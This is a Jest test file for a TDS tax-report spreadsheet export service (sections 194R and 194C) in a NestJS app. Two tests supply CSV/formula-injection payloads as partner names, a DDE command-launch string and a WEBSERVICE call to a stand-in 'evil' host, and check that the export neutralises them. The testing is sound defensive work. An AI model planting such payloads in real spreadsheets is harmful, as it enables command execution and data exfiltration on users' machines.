/**
 * Unit tests for TdsService export methods — P6.5c.
 *
 * Tests cover:
 *   - export194R: buffer built, correct columns, paise÷100 values,
 *     TDS rate column (10 for PAN / 20 for no-PAN), name resolution,
 *     __NO_PAN__ → "NO PAN ON FILE".
 *   - export194C: buffer built, correct columns, two TDS columns
 *     (with-threshold / no-threshold), TDS rate (1/2/20), name resolution.
 *
 * Strategy: mock compute194R / compute194C via spies (they are tested fully
 * in tds.service.spec.ts); also mock the Prisma ChannelPartner.findMany used
 * by the name-resolution step inside the export methods.
 *
 * Run: npx jest src/tds/tds.export.spec.ts
 */
import * as XLSX from 'xlsx';
import { Test, TestingModule } from '@nestjs/testing';
import { TdsService, TdsRow194R, TdsRow194C } from './tds.service';
import { PrismaService } from '../prisma/prisma.service';

// ─── Mock Prisma ─────────────────────────────────────────────────────────────

const mockPrisma = {
  creditPayoutEntry: { findMany: jest.fn() },
  creditField: { findMany: jest.fn() },
  outlet: { findMany: jest.fn() },
  channelPartner: { findMany: jest.fn() },
  redemptionOrder: { findMany: jest.fn() },
  tdsOffPlatformEntry: { findMany: jest.fn() },
  tdsDeposit: { findMany: jest.fn() },
};

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Parse the first sheet of an xlsx Buffer back to an array of row objects. */
function parseXlsx(buffer: Buffer, sheetIndex = 0): Record<string, unknown>[] {
  const wb = XLSX.read(buffer, { type: 'buffer' });
  const ws = wb.Sheets[wb.SheetNames[sheetIndex]];
  return XLSX.utils.sheet_to_json<Record<string, unknown>>(ws);
}

const CLIENT_ID = 'deoleo';
const FY = '2025-26';

// ─── Fixture rows ─────────────────────────────────────────────────────────────

const ROW_194R_PAN: TdsRow194R = {
  panNumber: 'ABCDE1234F',
  fyLabel: FY,
  baseFyTotalPaise: 2_100_000n,   // ₹21,000
  liabilityPaise: 233300n,         // from 10/90 grossing — pre-computed
  depositedPaise: 100_000n,        // ₹1,000
  outstandingPaise: 133300n,
};

const ROW_194R_NOPAN: TdsRow194R = {
  panNumber: '__NO_PAN__',
  fyLabel: FY,
  baseFyTotalPaise: 2_500_000n,   // ₹25,000
  liabilityPaise: 625_000n,        // 20/80
  depositedPaise: 0n,
  outstandingPaise: 625_000n,
};

const ROW_194C_INDIVIDUAL: TdsRow194C = {
  panNumber: 'IND0011111A',
  entityType: 'INDIVIDUAL',
  fyLabel: FY,
  baseFyTotalPaise: 12_000_000n,  // ₹1,20,000
  maxSinglePaise: 6_000_000n,
  thresholdMet: true,
  liabilityPaise: 121200n,          // 1/99
  liabilityNoThresholdPaise: 121200n,
  depositedPaise: 0n,
  outstandingPaise: 121200n,
  methodology: 'GROSS_UP',
  withheldPaise: 0n,
  recoveredPaise: 0n,
  recoveryByTenant: [],
};

const ROW_194C_COMPANY: TdsRow194C = {
  panNumber: 'COM0022222B',
  entityType: 'COMPANY',
  fyLabel: FY,
  baseFyTotalPaise: 3_100_000n,   // ₹31,000 — single > ₹30k
  maxSinglePaise: 3_100_000n,
  thresholdMet: true,
  liabilityPaise: 63300n,           // 2/98
  liabilityNoThresholdPaise: 63300n,
  depositedPaise: 50_000n,
  outstandingPaise: 13300n,         // 63300 − 50000 − 0
  methodology: 'DEDUCT',
  withheldPaise: 0n,
  recoveredPaise: 0n,
  recoveryByTenant: [],
};

const ROW_194C_NOPAN: TdsRow194C = {
  panNumber: '__NO_PAN__',
  entityType: 'OTHERS',
  fyLabel: FY,
  baseFyTotalPaise: 4_000_000n,
  maxSinglePaise: 4_000_000n,
  thresholdMet: true,
  liabilityPaise: 1_000_000n,       // 20/80
  liabilityNoThresholdPaise: 1_000_000n,
  depositedPaise: 0n,
  outstandingPaise: 1_000_000n,
  methodology: null,
  withheldPaise: 0n,
  recoveredPaise: 0n,
  recoveryByTenant: [],
};

// DEDUCT PAN with real withholding collected (₹500 withheld, ₹1,000 deposited).
const ROW_194C_DEDUCT: TdsRow194C = {
  panNumber: 'DED0033333C',
  entityType: 'COMPANY',
  fyLabel: FY,
  baseFyTotalPaise: 12_000_000n,
  maxSinglePaise: 6_000_000n,
  thresholdMet: true,
  liabilityPaise: 244900n,
  liabilityNoThresholdPaise: 244900n,
  depositedPaise: 100_000n,
  outstandingPaise: 94900n,         // 244900 − 100000 − 50000
  methodology: 'DEDUCT',
  withheldPaise: 50_000n,
  recoveredPaise: 0n,
  recoveryByTenant: [],
};

// GROSS-UP PAN with per-tenant recovery attribution (report-only, not netted).
const ROW_194C_GROSSUP: TdsRow194C = {
  panNumber: 'GRS0044444D',
  entityType: 'COMPANY',
  fyLabel: FY,
  baseFyTotalPaise: 12_000_000n,
  maxSinglePaise: 6_000_000n,
  thresholdMet: true,
  liabilityPaise: 244900n,
  liabilityNoThresholdPaise: 244900n,
  depositedPaise: 0n,
  outstandingPaise: 244900n,        // recovery does NOT reduce outstanding
  methodology: 'GROSS_UP',
  withheldPaise: 0n,
  recoveredPaise: 244_900n,
  recoveryByTenant: [
    { clientId: 'deoleo', tenantSharePaise: 150_000n },
    { clientId: 'britannia', tenantSharePaise: 94_900n },
  ],
};

// ─── Tests ─────────────────────────────────────────────────────────────────────

describe('TdsService — export194R (P6.5c)', () => {
  let service: TdsService;

  beforeEach(async () => {
    jest.clearAllMocks();
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        TdsService,
        { provide: PrismaService, useValue: mockPrisma },
      ],
    }).compile();
    service = module.get(TdsService);

    // Safe defaults
    mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([]);
    mockPrisma.creditField.findMany.mockResolvedValue([]);
    mockPrisma.outlet.findMany.mockResolvedValue([]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);
    mockPrisma.redemptionOrder.findMany.mockResolvedValue([]);
    mockPrisma.tdsOffPlatformEntry.findMany.mockResolvedValue([]);
    mockPrisma.tdsDeposit.findMany.mockResolvedValue([]);
  });

  it('returns a Buffer and the correct filename', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'ABCDE1234F', ownerName: 'Ramesh Patel', businessName: 'Ramesh Store' },
    ]);

    const { buffer, filename } = await service.export194R(CLIENT_ID, FY);

    expect(Buffer.isBuffer(buffer)).toBe(true);
    expect(buffer.length).toBeGreaterThan(0);
    expect(filename).toBe(`tds-194r-${FY}.xlsx`);
  });

  it('produces expected columns on the detail sheet', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0); // first sheet

    expect(rows).toHaveLength(1);
    const keys = Object.keys(rows[0]);
    expect(keys).toContain('S.No');
    expect(keys).toContain('Deductee Name');
    expect(keys).toContain('PAN');
    expect(keys).toContain('Section');
    expect(keys).toContain('Amount Paid (₹)');
    expect(keys).toContain('TDS Rate %');
    expect(keys).toContain('TDS Amount (₹)');
    expect(keys).toContain('Already Deposited (₹)');
    expect(keys).toContain('Outstanding (₹)');
    expect(keys).toContain('FY');
  });

  it('converts paise → ₹ correctly (÷100, 2 decimals)', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);

    // baseFyTotalPaise = 2,100,000 → ₹21,000.00
    expect(rows[0]['Amount Paid (₹)']).toBe('21000.00');
    // liabilityPaise = 233,300 → ₹2,333.00
    expect(rows[0]['TDS Amount (₹)']).toBe('2333.00');
    // depositedPaise = 100,000 → ₹1,000.00
    expect(rows[0]['Already Deposited (₹)']).toBe('1000.00');
    // outstandingPaise = 133,300 → ₹1,333.00
    expect(rows[0]['Outstanding (₹)']).toBe('1333.00');
  });

  it('sets TDS Rate % = 10 for PAN holder', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(10);
  });

  it('sets TDS Rate % = 20 for __NO_PAN__ bucket', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_NOPAN]);
    // No partners needed — __NO_PAN__ is skipped in the DB lookup
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(20);
  });

  it('resolves PAN → ownerName from ChannelPartner', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'ABCDE1234F', ownerName: 'Ramesh Patel', businessName: 'Ramesh Store' },
    ]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('Ramesh Patel');
  });

  it('falls back to businessName when ownerName is blank', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'ABCDE1234F', ownerName: '', businessName: 'Ramesh Store' },
    ]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('Ramesh Store');
  });

  it('sets Deductee Name = "NO PAN ON FILE" for __NO_PAN__ bucket', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('NO PAN ON FILE');
  });

  it('leaves Deductee Name blank for unknown/off-platform PAN', async () => {
    const offPlatformRow: TdsRow194R = {
      ...ROW_194R_PAN,
      panNumber: 'ZZZZZ9999Z', // not in ChannelPartner
    };
    jest.spyOn(service, 'compute194R').mockResolvedValue([offPlatformRow]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]); // no match

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('');
  });

  it('leaves PAN cell blank for __NO_PAN__ row', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    // XLSX sheet_to_json omits blank string cells — check undefined or ''
    expect(rows[0]['PAN'] ?? '').toBe('');
  });

  it('includes a Summary sheet as the second sheet', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const wb = XLSX.read(buffer, { type: 'buffer' });
    expect(wb.SheetNames).toHaveLength(2);
    expect(wb.SheetNames[1]).toBe('Summary');

    const summaryRows = parseXlsx(buffer, 1);
    const totalDeductees = summaryRows.find((r) => r['Field'] === 'Total Deductees');
    expect(totalDeductees?.['Value']).toBe(1);
  });

  it('rows are numbered sequentially in S.No', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN, ROW_194R_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['S.No']).toBe(1);
    expect(rows[1]['S.No']).toBe(2);
  });

  it('neutralises spreadsheet formula injection in the Deductee Name cell', async () => {
    jest.spyOn(service, 'compute194R').mockResolvedValue([ROW_194R_PAN]);
    // Partner-supplied owner name is a live-formula payload.
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'ABCDE1234F', ownerName: '=cmd()|/c calc', businessName: '' },
    ]);

    const { buffer } = await service.export194R(CLIENT_ID, FY);
    const rows = parseXlsx(buffer, 0);
    // Prefixed with an apostrophe so Excel treats it as text, not a formula.
    expect(rows[0]['Deductee Name']).toBe(`'=cmd()|/c calc`);
  });
});

// ─── 194C export ─────────────────────────────────────────────────────────────

describe('TdsService — export194C (P6.5c)', () => {
  let service: TdsService;

  beforeEach(async () => {
    jest.clearAllMocks();
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        TdsService,
        { provide: PrismaService, useValue: mockPrisma },
      ],
    }).compile();
    service = module.get(TdsService);

    mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([]);
    mockPrisma.creditField.findMany.mockResolvedValue([]);
    mockPrisma.outlet.findMany.mockResolvedValue([]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);
    mockPrisma.redemptionOrder.findMany.mockResolvedValue([]);
    mockPrisma.tdsOffPlatformEntry.findMany.mockResolvedValue([]);
    mockPrisma.tdsDeposit.findMany.mockResolvedValue([]);
  });

  it('returns a Buffer and the correct filename', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_INDIVIDUAL]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer, filename } = await service.export194C(FY);

    expect(Buffer.isBuffer(buffer)).toBe(true);
    expect(buffer.length).toBeGreaterThan(0);
    expect(filename).toBe(`tds-194c-${FY}.xlsx`);
  });

  it('produces all expected columns', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);

    expect(rows).toHaveLength(1);
    const keys = Object.keys(rows[0]);
    expect(keys).toContain('S.No');
    expect(keys).toContain('Deductee Name');
    expect(keys).toContain('PAN');
    expect(keys).toContain('Entity Type');
    expect(keys).toContain('Section');
    expect(keys).toContain('Methodology');
    expect(keys).toContain('Amount Paid (₹)');
    expect(keys).toContain('TDS Rate %');
    expect(keys).toContain('TDS — With Threshold (₹)');
    expect(keys).toContain('TDS — No Threshold (₹)');
    expect(keys).toContain('Threshold Met (Y/N)');
    expect(keys).toContain('Already Deposited (₹)');
    expect(keys).toContain('TDS Withheld (Deduct) (₹)');
    expect(keys).toContain('TDS Recovered (Gross-Up) (₹)');
    expect(keys).toContain('Outstanding (₹)');
    expect(keys).toContain('FY');
  });

  it('writes both TDS columns correctly (paise÷100)', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);

    // liabilityPaise = 63,300 → ₹633.00
    expect(rows[0]['TDS — With Threshold (₹)']).toBe('633.00');
    // liabilityNoThresholdPaise = 63,300 → ₹633.00
    expect(rows[0]['TDS — No Threshold (₹)']).toBe('633.00');
    // Amount Paid: 3,100,000 → ₹31,000.00
    expect(rows[0]['Amount Paid (₹)']).toBe('31000.00');
  });

  it('sets TDS Rate % = 1 for INDIVIDUAL', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_INDIVIDUAL]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(1);
  });

  it('sets TDS Rate % = 2 for COMPANY/OTHERS', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(2);
  });

  it('sets TDS Rate % = 1 for HUF', async () => {
    const hufRow: TdsRow194C = { ...ROW_194C_INDIVIDUAL, entityType: 'HUF', panNumber: 'HUF0012345H' };
    jest.spyOn(service, 'compute194C').mockResolvedValue([hufRow]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(1);
  });

  it('sets TDS Rate % = 20 for __NO_PAN__', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['TDS Rate %']).toBe(20);
  });

  it('writes "Y" / "N" for Threshold Met column', async () => {
    const belowThresholdRow: TdsRow194C = {
      ...ROW_194C_INDIVIDUAL,
      thresholdMet: false,
      liabilityPaise: 0n,
    };
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY, belowThresholdRow]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Threshold Met (Y/N)']).toBe('Y');
    expect(rows[1]['Threshold Met (Y/N)']).toBe('N');
  });

  it('resolves PAN → name platform-wide from ChannelPartner', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'COM0022222B', ownerName: 'Sharma Industries', businessName: 'Sharma Co' },
    ]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('Sharma Industries');
  });

  it('sets Deductee Name = "NO PAN ON FILE" for __NO_PAN__', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe('NO PAN ON FILE');
  });

  it('leaves PAN cell blank for __NO_PAN__ row', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['PAN'] ?? '').toBe('');
  });

  it('deposited and outstanding paise convert correctly', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);

    // depositedPaise = 50,000 → ₹500.00
    expect(rows[0]['Already Deposited (₹)']).toBe('500.00');
    // outstandingPaise = 13,300 → ₹133.00
    expect(rows[0]['Outstanding (₹)']).toBe('133.00');
  });

  it('handles empty rows gracefully (no-op buffer)', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer, filename } = await service.export194C(FY);
    expect(Buffer.isBuffer(buffer)).toBe(true);
    // No rows in the sheet — sheet_to_json returns []
    const rows = parseXlsx(buffer, 0);
    expect(rows).toHaveLength(0);
    expect(filename).toBe(`tds-194c-${FY}.xlsx`);
  });

  it('neutralises spreadsheet formula injection in Deductee Name', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_COMPANY]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'COM0022222B', ownerName: '=WEBSERVICE("http://evil")', businessName: '' },
    ]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Deductee Name']).toBe(`'=WEBSERVICE("http://evil")`);
  });

  it('writes the Methodology column (DEDUCT / GROSS_UP / blank)', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_DEDUCT, ROW_194C_GROSSUP, ROW_194C_NOPAN]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    expect(rows[0]['Methodology']).toBe('DEDUCT');
    expect(rows[1]['Methodology']).toBe('GROSS_UP');
    // null methodology → blank cell (sheet_to_json omits empty strings)
    expect(rows[2]['Methodology'] ?? '').toBe('');
  });

  it('writes the DEDUCT-withheld vs GROSS-UP-recovered split (paise÷100)', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_DEDUCT, ROW_194C_GROSSUP]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([]);

    const { buffer } = await service.export194C(FY);
    const rows = parseXlsx(buffer, 0);
    // DEDUCT row: withheld ₹500, recovered ₹0, outstanding ₹949 (244900 − 100000 − 50000)
    expect(rows[0]['TDS Withheld (Deduct) (₹)']).toBe('500.00');
    expect(rows[0]['TDS Recovered (Gross-Up) (₹)']).toBe('0.00');
    expect(rows[0]['Outstanding (₹)']).toBe('949.00');
    // GROSS-UP row: withheld ₹0, recovered ₹2,449, outstanding UNCHANGED at ₹2,449
    expect(rows[1]['TDS Withheld (Deduct) (₹)']).toBe('0.00');
    expect(rows[1]['TDS Recovered (Gross-Up) (₹)']).toBe('2449.00');
    expect(rows[1]['Outstanding (₹)']).toBe('2449.00');
  });

  it('emits a "Gross-Up Recovery by Tenant" sheet with per-tenant attribution', async () => {
    jest.spyOn(service, 'compute194C').mockResolvedValue([ROW_194C_GROSSUP]);
    mockPrisma.channelPartner.findMany.mockResolvedValue([
      { panNumber: 'GRS0044444D', ownerName: 'Grocers United', businessName: '' },
    ]);

    const { buffer } = await service.export194C(FY);
    const wb = XLSX.read(buffer, { type: 'buffer' });
    expect(wb.SheetNames).toContain('Gross-Up Recovery by Tenant');

    const recRows = parseXlsx(buffer, wb.SheetNames.indexOf('Gross-Up Recovery by Tenant'));
    expect(recRows).toHaveLength(2);
    expect(recRows[0]['Recovered From (Client)']).toBe('deoleo');
    expect(recRows[0]['Recovery Amount (₹)']).toBe('1500.00');
    expect(recRows[1]['Recovered From (Client)']).toBe('britannia');
    expect(recRows[1]['Recovery Amount (₹)']).toBe('949.00');
    expect(recRows[0]['PAN']).toBe('GRS0044444D');
  });
});
